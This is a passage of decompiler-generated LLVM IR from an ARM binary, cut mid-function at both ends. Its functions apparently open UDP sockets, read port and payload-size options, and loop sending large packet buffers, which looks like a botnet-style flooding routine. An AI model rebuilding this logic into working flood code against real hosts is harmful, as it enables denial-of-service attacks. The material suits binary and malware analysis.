  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8b0c = udiv i32 %v3_89c0, 256
  %v1_8b08 = mul i32 %v5_89b8, 256
  %v4_8b10 = and i32 %v1_8b08, 65280
  %v5_8b10 = or i32 %v4_8b10, %v3_8b0c
  %v2_8a90 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8af0

dec_label_pc_8a70:                                ; preds = %bb51, %dec_label_pc_8b30
  %v3_8a7c = call i32 @function_11aec(i32 2, i32 2, i32 17)
  %v7_8a84 = icmp eq i32 %v3_8a7c, -1
  %v0_8a88 = load i32, i32* @sb, align 4
  %v1_8a88 = add i32 %v0_8a88, 1
  store i32 %v1_8a88, i32* @sb, align 4
  %v0_8a8c = load i32, i32* @fp, align 4
  %v1_8a8c = add i32 %v0_8a8c, 24
  store i32 %v1_8a8c, i32* @fp, align 4
  %v2_8a98 = load i32, i32* @r8, align 4
  %v3_8a98 = add i32 %v2_8a98, %stack_var_-60.0
  %v4_8a98 = inttoptr i32 %v3_8a98 to i32*
  store i32 %v3_8a7c, i32* %v4_8a98, align 4
  br i1 %v7_8a84, label %dec_label_pc_8b8c, label %dec_label_pc_8aa0

dec_label_pc_8aa0:                                ; preds = %dec_label_pc_8a70
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8ab8 = call i32 @function_1189c(i32 %v3_8a7c, i32 %v2_8a90, i32 16)
  %v0_8abc = load i32, i32* @r6, align 4
  %v1_8abc = add i32 %v0_8abc, 20
  %v2_8abc = inttoptr i32 %v1_8abc to i8*
  %v3_8abc = load i8, i8* %v2_8abc, align 1
  %v4_8abc = zext i8 %v3_8abc to i32
  store i32 %v4_8abc, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8abc, 32
  br i1 %tmp, label %dec_label_pc_8b44, label %dec_label_pc_8ac8

dec_label_pc_8ac8:                                ; preds = %dec_label_pc_8aa0, %dec_label_pc_8b44
  %v0_8acc = phi i32 [ %v0_8abc, %dec_label_pc_8aa0 ], [ %v0_8acc.pre, %dec_label_pc_8b44 ]
  %v1_8ad0 = load i32, i32* @r8, align 4
  %v2_8ad0 = add i32 %v1_8ad0, %stack_var_-60.0
  %v3_8ad0 = inttoptr i32 %v2_8ad0 to i32*
  %v4_8ad0 = load i32, i32* %v3_8ad0, align 4
  %v3_8ad8 = call i32 @function_118d4(i32 %v4_8ad0, i32 %v0_8acc, i32 16)
  %v0_8ae0 = load i32, i32* @sb, align 4
  %v1_8ae0 = load i32, i32* @r7, align 4
  %v9_8ae0 = icmp eq i32 %v0_8ae0, %v1_8ae0
  %v1_8ae4 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8ae4, i32* %r3.global-to-local, align 4
  br i1 %v9_8ae0, label %dec_label_pc_8b98, label %dec_label_pc_8af0

dec_label_pc_8af0:                                ; preds = %dec_label_pc_8ac8, %dec_label_pc_8a60
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8a60 ], [ %v1_8ae4, %dec_label_pc_8ac8 ]
  store i32 65535, i32* @r4, align 4
  %v2_8b00 = call i32 @function_12654(i32 65535, i32 1)
  store i32 %v5_8b10, i32* %r3.global-to-local, align 4
  %v1_8b1c = load i32, i32* @r4, align 4
  %v9_8b1c = icmp eq i32 %v3_89c0, %v1_8b1c
  %v1_8b20 = load i32, i32* @fp, align 4
  %v2_8b20 = add i32 %v1_8b20, %arg2
  store i32 %v2_8b20, i32* @r6, align 4
  %v2_8b24 = load i32, i32* @sl, align 4
  %v3_8b24 = add i32 %v2_8b24, %stack_var_-60.0
  %v4_8b24 = inttoptr i32 %v3_8b24 to i32*
  store i32 %v2_8b00, i32* %v4_8b24, align 4
  br i1 %v9_8b1c, label %dec_label_pc_8b30, label %bb51

bb51:                                             ; preds = %dec_label_pc_8af0
  %v1_8b28 = load i32, i32* %r3.global-to-local, align 4
  %v2_8b28 = trunc i32 %v1_8b28 to i16
  %v3_8b28 = load i32, i32* @r6, align 4
  %v4_8b28 = add i32 %v3_8b28, 2
  %v5_8b28 = inttoptr i32 %v4_8b28 to i16*
  store i16 %v2_8b28, i16* %v5_8b28, align 2
  br label %dec_label_pc_8a70

dec_label_pc_8b30:                                ; preds = %dec_label_pc_8af0
  %v0_8b30 = call i32 @function_e0d0()
  %v1_8b30 = trunc i32 %v0_8b30 to i16
  %v0_8b38 = load i32, i32* @fp, align 4
  %v2_8b38 = add i32 %v0_8b38, %arg2
  store i32 %v2_8b38, i32* @r6, align 4
  %v4_8b3c = add i32 %v2_8b38, 2
  %v5_8b3c = inttoptr i32 %v4_8b3c to i16*
  store i16 %v1_8b30, i16* %v5_8b3c, align 2
  br label %dec_label_pc_8a70

dec_label_pc_8b44:                                ; preds = %dec_label_pc_8aa0
  %v1_8b44 = add i32 %v0_8abc, 16
  %v2_8b44 = inttoptr i32 %v1_8b44 to i32*
  %v3_8b44 = load i32, i32* %v2_8b44, align 4
  store i32 %v3_8b44, i32* %r4.global-to-local, align 4
  %v0_8b48 = call i32 @function_e0d0()
  %v1_8b58 = and i32 %v3_8b44, 65280
  store i32 %v1_8b58, i32* %r3.global-to-local, align 4
  %v0_8b60 = load i32, i32* @r6, align 4
  %v1_8b60 = add i32 %v0_8b60, 20
  %v2_8b60 = inttoptr i32 %v1_8b60 to i8*
  %v3_8b60 = load i8, i8* %v2_8b60, align 1
  %v4_8b60 = zext i8 %v3_8b60 to i32
  %v5_8b64 = call i32 @llvm.bswap.i32(i32 %v3_8b44)
  %v7_8b68 = lshr i32 %v0_8b48, %v4_8b60
  %v8_8b68 = add i32 %v7_8b68, %v5_8b64
  %v5_8b80 = call i32 @llvm.bswap.i32(i32 %v8_8b68)
  store i32 %v5_8b80, i32* %r3.global-to-local, align 4
  %v2_8b84 = add i32 %v0_8b60, 4
  %v3_8b84 = inttoptr i32 %v2_8b84 to i32*
  store i32 %v5_8b80, i32* %v3_8b84, align 4
  %v0_8acc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8ac8

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8a70
  store i32 %v3_896c, i32* %r4.global-to-local, align 4
  store i32 %v18_896c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8a7c

dec_label_pc_8b98:                                ; preds = %dec_label_pc_8ac8, %dec_label_pc_8a58
  %v1_8bd822 = phi i32 [ 0, %dec_label_pc_8a58 ], [ %v0_8ae0, %dec_label_pc_8ac8 ]
  %v2_8b9c = icmp eq i32 %v0_8a3c10, 0
  br i1 %v2_8b9c, label %dec_label_pc_8bbc.outer, label %dec_label_pc_8bd4

dec_label_pc_8bac:                                ; preds = %dec_label_pc_8bbc
  store i32 %v1_8bb0, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8bac = load i32, i32* @r8, align 4
  %v4_8bac = mul i32 %v1_8bb0, 4
  %v5_8bac = add i32 %v0_8bac, %v4_8bac
  %v6_8bac = inttoptr i32 %v5_8bac to i32*
  %v7_8bac = load i32, i32* %v6_8bac, align 4
  %v0_8bb0 = load i32, i32* @sl, align 4
  %v5_8bb0 = add i32 %v0_8bb0, %v4_8bac
  %v6_8bb0 = inttoptr i32 %v5_8bb0 to i32*
  %v7_8bb0 = load i32, i32* %v6_8bb0, align 4
  %v4_8bb4 = call i32 @function_11a30(i32 %v7_8bac, i32 %v7_8bb0, i32 %v0_8bc0, i32 16384)
  %v0_8bb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_8bb8 = add i32 %v0_8bb8, 1
  %v0_8bbc.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bbc.outer

dec_label_pc_8bbc.outer:                          ; preds = %dec_label_pc_8b98, %dec_label_pc_8bac
  %v0_8bbc.ph = phi i32 [ %v0_8bbc.pre.pre, %dec_label_pc_8bac ], [ %v1_8bd822, %dec_label_pc_8b98 ]
  %v1_8bb0.ph = phi i32 [ %v1_8bb8, %dec_label_pc_8bac ], [ 0, %dec_label_pc_8b98 ]
  %v0_8bc0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8bbc

dec_label_pc_8bbc:                                ; preds = %dec_label_pc_8bbc.outer, %dec_label_pc_8bbc
  %v1_8bb0 = phi i32 [ 0, %dec_label_pc_8bbc ], [ %v1_8bb0.ph, %dec_label_pc_8bbc.outer ]
  %v8_8bc8 = icmp sgt i32 %v0_8bbc.ph, %v1_8bb0
  br i1 %v8_8bc8, label %dec_label_pc_8bac, label %dec_label_pc_8bbc

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8bd8, %dec_label_pc_8b98
  %v1_8bd821 = phi i32 [ %v1_8bd822, %dec_label_pc_8b98 ], [ %v1_8bd8, %dec_label_pc_8bd8 ]
  br label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8be4, %dec_label_pc_8bd4
  %v1_8bd8 = phi i32 [ %v1_8bd821, %dec_label_pc_8bd4 ], [ %v1_8bd8.pre, %dec_label_pc_8be4 ]
  %v1_8be4 = phi i32 [ 0, %dec_label_pc_8bd4 ], [ %v1_8c04, %dec_label_pc_8be4 ]
  store i32 %v1_8be4, i32* @r6, align 4
  %v6_8be0 = icmp slt i32 %v1_8be4, %v1_8bd8
  br i1 %v6_8be0, label %dec_label_pc_8be4, label %dec_label_pc_8bd4

dec_label_pc_8be4:                                ; preds = %dec_label_pc_8bd8
  %v0_8bdc = load i32, i32* @r5, align 4
  %v0_8be4 = load i32, i32* @sl, align 4
  %v4_8be4 = mul i32 %v1_8be4, 4
  %v5_8be4 = add i32 %v0_8be4, %v4_8be4
  %v6_8be4 = inttoptr i32 %v5_8be4 to i32*
  %v7_8be4 = load i32, i32* %v6_8be4, align 4
  store i32 %v7_8be4, i32* @r4, align 4
  %v2_8bec = inttoptr i32 %v7_8be4 to i16*
  %v3_8bec = call i32 @function_e264(i16* %v2_8bec, i32 %v0_8bdc)
  %v0_8bf0 = load i32, i32* @r8, align 4
  %v1_8bf0 = load i32, i32* @r6, align 4
  %v4_8bf0 = mul i32 %v1_8bf0, 4
  %v5_8bf0 = add i32 %v4_8bf0, %v0_8bf0
  %v6_8bf0 = inttoptr i32 %v5_8bf0 to i32*
  %v7_8bf0 = load i32, i32* %v6_8bf0, align 4
  %v0_8bf4 = load i32, i32* @r4, align 4
  %v0_8bf8 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8c00 = call i32 @function_11a30(i32 %v7_8bf0, i32 %v0_8bf4, i32 %v0_8bf8, i32 16384)
  %v0_8c04 = load i32, i32* @r6, align 4
  %v1_8c04 = add i32 %v0_8c04, 1
  %v1_8bd8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8bd8

; uselistorder directives
  uselistorder i32 %v1_8bd8, { 1, 0 }
  uselistorder i32 %v1_8bb0, { 2, 1, 0 }
  uselistorder i32 %v5_8b80, { 1, 0 }
  uselistorder i32 %v3_8b44, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8abc, { 1, 0, 2 }
  uselistorder i32 %v3_8a7c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8a10, { 1, 0 }
  uselistorder i32 %v3_89c0, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc, { 1, 0 }
  uselistorder label %dec_label_pc_8bbc.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8ac8, { 1, 0 }
  uselistorder label %dec_label_pc_8a70, { 1, 0 }
  uselistorder label %dec_label_pc_8a58, { 1, 0 }
}

define i32 @function_8c0c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8c0c:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_8c0c = load i32, i32* @r4, align 4
  %v18_8c0c = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8c28 = call i32 @function_12654(i32 %arg1, i32 4)
  store i32 %v2_8c28, i32* @sl, align 4
  %v0_8c34 = load i32, i32* @r7, align 4
  %v2_8c38 = call i32 @function_12654(i32 %v0_8c34, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_8c44 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_8c38, i32* @r8, align 4
  %v0_8c54 = load i32, i32* @r5, align 4
  %v4_8c58 = inttoptr i32 %v0_8c44 to i32*
  %v5_8c58 = call i32 @function_8570(i32 %v0_8c54, i32* %v4_8c58, i32 7, i32 65535)
  %v3_8c60 = urem i32 %v5_8c58, 65536
  %v0_8c64 = load i32, i32* @r6, align 4
  %v0_8c6c = load i32, i32* @r4, align 4
  store i32 %v0_8c6c, i32* %r3.global-to-local, align 4
  %v0_8c70 = load i32, i32* @r5, align 4
  %v5_8c78 = inttoptr i32 %v0_8c64 to i32*
  %v6_8c78 = call i32 @function_8570(i32 %v0_8c70, i32* %v5_8c78, i32 6, i32 %v0_8c6c)
  %v0_8c7c = load i32, i32* @r6, align 4
  %v3_8c80 = mul i32 %v6_8c78, 65536
  store i32 %v3_8c80, i32* %sb.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v0_8c8c = load i32, i32* @r5, align 4
  %v4_8c90 = inttoptr i32 %v0_8c7c to i32*
  %v5_8c90 = call i32 @function_8570(i32 %v0_8c8c, i32* %v4_8c90, i32 0, i32 1024)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8ca0 = load i32, i32* @r6, align 4
  %v0_8ca4 = load i32, i32* @r5, align 4
  %v3_8ca8 = urem i32 %v5_8c90, 65536
  store i32 %v3_8ca8, i32* @r5, align 4
  %v4_8cac = inttoptr i32 %v0_8ca0 to i32*
  %v5_8cac = call i32 @function_8570(i32 %v0_8ca4, i32* %v4_8cac, i32 1, i32 1)
  %v0_8cb0 = load i32, i32* %sb.global-to-local, align 4
  %v3_8cb0 = udiv i32 %v0_8cb0, 65536
  store i32 %v3_8cb0, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8cb8 = load i32, i32* @r4, align 4
  %v9_8cb8 = icmp eq i32 %v3_8cb0, %v1_8cb8
  br i1 %v9_8cb8, label %dec_label_pc_8ce8, label %bb

bb:                                               ; preds = %dec_label_pc_8c0c
  store i32 0, i32* %stack_var_-56, align 4
  %v4_8cd0 = udiv i32 %v0_8cb0, 16777216
  store i32 %v4_8cd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8cf8

dec_label_pc_8ce8:                                ; preds = %dec_label_pc_8c0c
  store i32 0, i32* %stack_var_-56, align 4
  %v0_8ce8 = call i32 @function_e0d0()
  br label %dec_label_pc_8cf8

dec_label_pc_8cf8:                                ; preds = %bb, %dec_label_pc_8ce8
  %v0_8cdc10 = urem i32 %v5_8cac, 256
  %v0_8cf8 = load i32, i32* @r7, align 4
  %v2_8cf8 = icmp eq i32 %v0_8cf8, 0
  br i1 %v2_8cf8, label %dec_label_pc_8e38, label %dec_label_pc_8d00

dec_label_pc_8d00:                                ; preds = %dec_label_pc_8cf8
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_8dac = udiv i32 %v3_8c60, 256
  %v1_8da8 = mul i32 %v5_8c58, 256
  %v4_8db0 = and i32 %v1_8da8, 65280
  %v5_8db0 = or i32 %v4_8db0, %v3_8dac
  %v2_8d30 = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_8d90

dec_label_pc_8d10:                                ; preds = %bb51, %dec_label_pc_8dd0
  %v3_8d1c = call i32 @function_11aec(i32 2, i32 2, i32 0)
  %v7_8d24 = icmp eq i32 %v3_8d1c, -1
  %v0_8d28 = load i32, i32* @sb, align 4
  %v1_8d28 = add i32 %v0_8d28, 1
  store i32 %v1_8d28, i32* @sb, align 4
  %v0_8d2c = load i32, i32* @fp, align 4
  %v1_8d2c = add i32 %v0_8d2c, 24
  store i32 %v1_8d2c, i32* @fp, align 4
  %v2_8d38 = load i32, i32* @r8, align 4
  %v3_8d38 = add i32 %v2_8d38, %stack_var_-60.0
  %v4_8d38 = inttoptr i32 %v3_8d38 to i32*
  store i32 %v3_8d1c, i32* %v4_8d38, align 4
  br i1 %v7_8d24, label %dec_label_pc_8e2c, label %dec_label_pc_8d40

dec_label_pc_8d40:                                ; preds = %dec_label_pc_8d10
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_8d58 = call i32 @function_1189c(i32 %v3_8d1c, i32 %v2_8d30, i32 16)
  %v0_8d5c = load i32, i32* @r6, align 4
  %v1_8d5c = add i32 %v0_8d5c, 20
  %v2_8d5c = inttoptr i32 %v1_8d5c to i8*
  %v3_8d5c = load i8, i8* %v2_8d5c, align 1
  %v4_8d5c = zext i8 %v3_8d5c to i32
  store i32 %v4_8d5c, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_8d5c, 32
  br i1 %tmp, label %dec_label_pc_8de4, label %dec_label_pc_8d68

dec_label_pc_8d68:                                ; preds = %dec_label_pc_8d40, %dec_label_pc_8de4
  %v0_8d6c = phi i32 [ %v0_8d5c, %dec_label_pc_8d40 ], [ %v0_8d6c.pre, %dec_label_pc_8de4 ]
  %v1_8d70 = load i32, i32* @r8, align 4
  %v2_8d70 = add i32 %v1_8d70, %stack_var_-60.0
  %v3_8d70 = inttoptr i32 %v2_8d70 to i32*
  %v4_8d70 = load i32, i32* %v3_8d70, align 4
  %v3_8d78 = call i32 @function_118d4(i32 %v4_8d70, i32 %v0_8d6c, i32 16)
  %v0_8d80 = load i32, i32* @sb, align 4
  %v1_8d80 = load i32, i32* @r7, align 4
  %v9_8d80 = icmp eq i32 %v0_8d80, %v1_8d80
  %v1_8d84 = add i32 %stack_var_-60.0, 4
  store i32 %v1_8d84, i32* %r3.global-to-local, align 4
  br i1 %v9_8d80, label %dec_label_pc_8e38, label %dec_label_pc_8d90

dec_label_pc_8d90:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8d00
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_8d00 ], [ %v1_8d84, %dec_label_pc_8d68 ]
  store i32 65535, i32* @r4, align 4
  %v2_8da0 = call i32 @function_12654(i32 65535, i32 1)
  store i32 %v5_8db0, i32* %r3.global-to-local, align 4
  %v1_8dbc = load i32, i32* @r4, align 4
  %v9_8dbc = icmp eq i32 %v3_8c60, %v1_8dbc
  %v1_8dc0 = load i32, i32* @fp, align 4
  %v2_8dc0 = add i32 %v1_8dc0, %arg2
  store i32 %v2_8dc0, i32* @r6, align 4
  %v2_8dc4 = load i32, i32* @sl, align 4
  %v3_8dc4 = add i32 %v2_8dc4, %stack_var_-60.0
  %v4_8dc4 = inttoptr i32 %v3_8dc4 to i32*
  store i32 %v2_8da0, i32* %v4_8dc4, align 4
  br i1 %v9_8dbc, label %dec_label_pc_8dd0, label %bb51

bb51:                                             ; preds = %dec_label_pc_8d90
  %v1_8dc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8dc8 = trunc i32 %v1_8dc8 to i16
  %v3_8dc8 = load i32, i32* @r6, align 4
  %v4_8dc8 = add i32 %v3_8dc8, 2
  %v5_8dc8 = inttoptr i32 %v4_8dc8 to i16*
  store i16 %v2_8dc8, i16* %v5_8dc8, align 2
  br label %dec_label_pc_8d10

dec_label_pc_8dd0:                                ; preds = %dec_label_pc_8d90
  %v0_8dd0 = call i32 @function_e0d0()
  %v1_8dd0 = trunc i32 %v0_8dd0 to i16
  %v0_8dd8 = load i32, i32* @fp, align 4
  %v2_8dd8 = add i32 %v0_8dd8, %arg2
  store i32 %v2_8dd8, i32* @r6, align 4
  %v4_8ddc = add i32 %v2_8dd8, 2
  %v5_8ddc = inttoptr i32 %v4_8ddc to i16*
  store i16 %v1_8dd0, i16* %v5_8ddc, align 2
  br label %dec_label_pc_8d10

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8d40
  %v1_8de4 = add i32 %v0_8d5c, 16
  %v2_8de4 = inttoptr i32 %v1_8de4 to i32*
  %v3_8de4 = load i32, i32* %v2_8de4, align 4
  store i32 %v3_8de4, i32* %r4.global-to-local, align 4
  %v0_8de8 = call i32 @function_e0d0()
  %v1_8df8 = and i32 %v3_8de4, 65280
  store i32 %v1_8df8, i32* %r3.global-to-local, align 4
  %v0_8e00 = load i32, i32* @r6, align 4
  %v1_8e00 = add i32 %v0_8e00, 20
  %v2_8e00 = inttoptr i32 %v1_8e00 to i8*
  %v3_8e00 = load i8, i8* %v2_8e00, align 1
  %v4_8e00 = zext i8 %v3_8e00 to i32
  %v5_8e04 = call i32 @llvm.bswap.i32(i32 %v3_8de4)
  %v7_8e08 = lshr i32 %v0_8de8, %v4_8e00
  %v8_8e08 = add i32 %v7_8e08, %v5_8e04
  %v5_8e20 = call i32 @llvm.bswap.i32(i32 %v8_8e08)
  store i32 %v5_8e20, i32* %r3.global-to-local, align 4
  %v2_8e24 = add i32 %v0_8e00, 4
  %v3_8e24 = inttoptr i32 %v2_8e24 to i32*
  store i32 %v5_8e20, i32* %v3_8e24, align 4
  %v0_8d6c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8d68

dec_label_pc_8e2c:                                ; preds = %dec_label_pc_8d10
  store i32 %v3_8c0c, i32* %r4.global-to-local, align 4
  store i32 %v18_8c0c, i32* %sb.global-to-local, align 4
  ret i32 %v3_8d1c

dec_label_pc_8e38:                                ; preds = %dec_label_pc_8d68, %dec_label_pc_8cf8
  %v1_8e7822 = phi i32 [ 0, %dec_label_pc_8cf8 ], [ %v0_8d80, %dec_label_pc_8d68 ]
  %v2_8e3c = icmp eq i32 %v0_8cdc10, 0
  br i1 %v2_8e3c, label %dec_label_pc_8e5c.outer, label %dec_label_pc_8e74

dec_label_pc_8e4c:                                ; preds = %dec_label_pc_8e5c
  store i32 %v1_8e50, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8e4c = load i32, i32* @r8, align 4
  %v4_8e4c = mul i32 %v1_8e50, 4
  %v5_8e4c = add i32 %v0_8e4c, %v4_8e4c
  %v6_8e4c = inttoptr i32 %v5_8e4c to i32*
  %v7_8e4c = load i32, i32* %v6_8e4c, align 4
  %v0_8e50 = load i32, i32* @sl, align 4
  %v5_8e50 = add i32 %v0_8e50, %v4_8e4c
  %v6_8e50 = inttoptr i32 %v5_8e50 to i32*
  %v7_8e50 = load i32, i32* %v6_8e50, align 4
  %v4_8e54 = call i32 @function_11a30(i32 %v7_8e4c, i32 %v7_8e50, i32 %v0_8e60, i32 16384)
  %v0_8e58 = load i32, i32* %r4.global-to-local, align 4
  %v1_8e58 = add i32 %v0_8e58, 1
  %v0_8e5c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e5c.outer

dec_label_pc_8e5c.outer:                          ; preds = %dec_label_pc_8e38, %dec_label_pc_8e4c
  %v0_8e5c.ph = phi i32 [ %v0_8e5c.pre.pre, %dec_label_pc_8e4c ], [ %v1_8e7822, %dec_label_pc_8e38 ]
  %v1_8e50.ph = phi i32 [ %v1_8e58, %dec_label_pc_8e4c ], [ 0, %dec_label_pc_8e38 ]
  %v0_8e60 = load i32, i32* @r5, align 4
  br label %dec_label_pc_8e5c

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8e5c.outer, %dec_label_pc_8e5c
  %v1_8e50 = phi i32 [ 0, %dec_label_pc_8e5c ], [ %v1_8e50.ph, %dec_label_pc_8e5c.outer ]
  %v8_8e68 = icmp sgt i32 %v0_8e5c.ph, %v1_8e50
  br i1 %v8_8e68, label %dec_label_pc_8e4c, label %dec_label_pc_8e5c

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e78, %dec_label_pc_8e38
  %v1_8e7821 = phi i32 [ %v1_8e7822, %dec_label_pc_8e38 ], [ %v1_8e78, %dec_label_pc_8e78 ]
  br label %dec_label_pc_8e78

dec_label_pc_8e78:                                ; preds = %dec_label_pc_8e84, %dec_label_pc_8e74
  %v1_8e78 = phi i32 [ %v1_8e7821, %dec_label_pc_8e74 ], [ %v1_8e78.pre, %dec_label_pc_8e84 ]
  %v1_8e84 = phi i32 [ 0, %dec_label_pc_8e74 ], [ %v1_8ea4, %dec_label_pc_8e84 ]
  store i32 %v1_8e84, i32* @r6, align 4
  %v6_8e80 = icmp slt i32 %v1_8e84, %v1_8e78
  br i1 %v6_8e80, label %dec_label_pc_8e84, label %dec_label_pc_8e74

dec_label_pc_8e84:                                ; preds = %dec_label_pc_8e78
  %v0_8e7c = load i32, i32* @r5, align 4
  %v0_8e84 = load i32, i32* @sl, align 4
  %v4_8e84 = mul i32 %v1_8e84, 4
  %v5_8e84 = add i32 %v0_8e84, %v4_8e84
  %v6_8e84 = inttoptr i32 %v5_8e84 to i32*
  %v7_8e84 = load i32, i32* %v6_8e84, align 4
  store i32 %v7_8e84, i32* @r4, align 4
  %v2_8e8c = inttoptr i32 %v7_8e84 to i16*
  %v3_8e8c = call i32 @function_e264(i16* %v2_8e8c, i32 %v0_8e7c)
  %v0_8e90 = load i32, i32* @r8, align 4
  %v1_8e90 = load i32, i32* @r6, align 4
  %v4_8e90 = mul i32 %v1_8e90, 4
  %v5_8e90 = add i32 %v4_8e90, %v0_8e90
  %v6_8e90 = inttoptr i32 %v5_8e90 to i32*
  %v7_8e90 = load i32, i32* %v6_8e90, align 4
  %v0_8e94 = load i32, i32* @r4, align 4
  %v0_8e98 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_8ea0 = call i32 @function_11a30(i32 %v7_8e90, i32 %v0_8e94, i32 %v0_8e98, i32 16384)
  %v0_8ea4 = load i32, i32* @r6, align 4
  %v1_8ea4 = add i32 %v0_8ea4, 1
  %v1_8e78.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_8e78

; uselistorder directives
  uselistorder i32 %v1_8e78, { 1, 0 }
  uselistorder i32 %v1_8e50, { 2, 1, 0 }
  uselistorder i32 %v5_8e20, { 1, 0 }
  uselistorder i32 %v3_8de4, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8d5c, { 1, 0, 2 }
  uselistorder i32 %v3_8d1c, { 1, 3, 2, 0 }
  uselistorder i32 %v3_8cb0, { 1, 0 }
  uselistorder i32 %v3_8c60, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 13, 1, 14, 15, 5, 6, 2, 3, 4, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c, { 1, 0 }
  uselistorder label %dec_label_pc_8e5c.outer, { 1, 0 }
  uselistorder label %dec_label_pc_8d68, { 1, 0 }
  uselistorder label %dec_label_pc_8d10, { 1, 0 }
  uselistorder label %dec_label_pc_8cf8, { 1, 0 }
}

define i32 @function_8eac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8eac:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eac = load i32, i32* @sb, align 4
  %v27_8eac = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8ec8 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_8ecc = load i32, i32* @r5, align 4
  store i32 %v0_8ecc, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8edc = load i32, i32* @r4, align 4
  store i32 %v0_8edc, i32* %r0.global-to-local, align 4
  %v5_8ee0 = inttoptr i32 %v0_8ecc to i32*
  %v6_8ee0 = call i32 @function_8570(i32 %v0_8edc, i32* %v5_8ee0, i32 2, i32 0)
  %v1_8eec = urem i32 %v6_8ee0, 256
  store i32 %v1_8eec, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8ef8 = load i32, i32* @r5, align 4
  store i32 %v0_8ef8, i32* %r1.global-to-local, align 4
  %v0_8efc = load i32, i32* @r4, align 4
  store i32 %v0_8efc, i32* %r0.global-to-local, align 4
  %v5_8f00 = trunc i32 %v6_8ee0 to i8
